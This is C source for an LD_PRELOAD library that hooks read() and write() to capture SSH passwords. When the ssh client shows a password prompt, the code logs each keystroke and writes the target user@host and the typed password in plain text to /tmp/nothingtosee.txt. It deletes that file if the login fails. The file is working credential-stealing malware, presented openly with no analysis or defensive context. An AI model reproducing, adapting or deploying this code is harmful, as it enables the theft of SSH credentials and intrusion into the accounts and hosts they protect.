#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdarg.h>


static int isAskingPasswd = 0;
static int isPasswordValid = 1;
static int isPasswordEntered = 0;
 
char *getssharg(){
  char *ssharg = malloc(sizeof(char) * 64);
  FILE *file = fopen("/proc/self/cmdline", "r");
  if (!file) {
    strcpy(ssharg, "NULL");
    return ssharg;
  }
  
  char fullstring[4096];
  ssize_t len_cmdline = fread(fullstring, 1, sizeof(fullstring), file);
  fclose(file);

  if (len_cmdline <= 0){
    strcpy(ssharg, "NULL");
    return ssharg;
  }
  
  for (int i = 0; i < len_cmdline; i++) {    
    if (fullstring[i] == '\0') {
      fullstring[i] = ' ';
    }
  }

  char *args = strtok(fullstring, " ");
  while ((args = strtok(NULL, " ")) != NULL) {
    if (strstr(args, "@")) {
      strncpy(ssharg, args, strlen(args));
      ssharg[strlen(args)] = '\0';
      return ssharg;
    }
    else {
      strcpy(ssharg, "NULL");
      return ssharg;
    }
  }
  strcpy(ssharg, "NULL");
  return ssharg;
}

int checkifssh(int fd){
  int pid = getpid();
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/comm", pid);
  FILE *file = fopen(path, "r");
  if (file) {
    char processName[64];
    fgets(processName, sizeof(processName), file);
    processName[strcspn(processName, "\n")] = 0;
    if (strcmp(processName, "ssh") == 0) {
      return 1;
    }
  }
  return 0;
}

ssize_t write(int fd, const void *buf, size_t nbyte) {
  ssize_t (*r_write)(int fd, const void *buf, size_t nbyte) = dlsym(RTLD_NEXT, "write");
  ssize_t output = r_write(fd, buf, nbyte);
  
  if (isatty(fd) && strstr(buf, "password:")) {
    isAskingPasswd = 1;
  }
  
  if (isatty(fd) && fd == 2) {
    if (strstr(buf ,"please try again.")) {
      isPasswordValid = 0;
    }
    else {
      isPasswordValid = 1;
    }
    
    if (isPasswordEntered == 1) {
      if (isPasswordValid == 0) {
        remove("/tmp/nothingtosee.txt");
      }
      isPasswordEntered = 0;
      isPasswordValid = 1;
    }

  
  }
  return output;
}


ssize_t read(int fd, void *buf, size_t nbytes) {
  ssize_t (*r_read)(int fd, void *buf, size_t nbytes) = dlsym(RTLD_NEXT, "read");
  ssize_t output = r_read(fd, buf, nbytes);
  static char passwd[64];
  static int pos = 0;
  
  int is_ssh = checkifssh(fd);
  if (isatty(fd) == 1 && is_ssh && isAskingPasswd == 1) {
    passwd[pos] = ((char *) buf)[0];
    if (((char*)buf)[0] == '\n') {
        passwd[pos] = '\0';
        isPasswordValid = 1;
        isPasswordEntered = 1;
        char *ssharg = getssharg();
        
        FILE *save = fopen("/tmp/nothingtosee.txt", "w");
        if (save) {
          char string[strlen(passwd) + strlen(ssharg) + 2];
          snprintf(string, sizeof(string), "%s %s\n", ssharg, passwd);
          fwrite(string, 1, strlen(string), save);
          fclose(save);
          isAskingPasswd = 0;
          pos = 0;
          memset(passwd, 0, sizeof(passwd));
          free(ssharg);
        }
    }
    else {
      pos++;
    }
  }




  return output;
  }
